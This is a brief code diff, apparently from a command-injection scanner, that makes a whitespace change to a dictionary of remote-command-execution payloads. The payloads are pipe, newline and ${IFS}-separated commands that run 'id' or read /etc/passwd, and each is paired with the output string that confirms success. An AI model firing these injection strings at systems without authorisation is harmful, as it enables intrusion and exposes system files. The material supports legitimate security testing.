@@ -54,7 +54,7 @@ rce_payloads = {
      '|cat /etc/passwd #':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '''
 id #''':'gid=',
-      '''
+     '''
 cat /etc/passwd #''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
       '''
 cat${IFS}/etc/passwd #''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
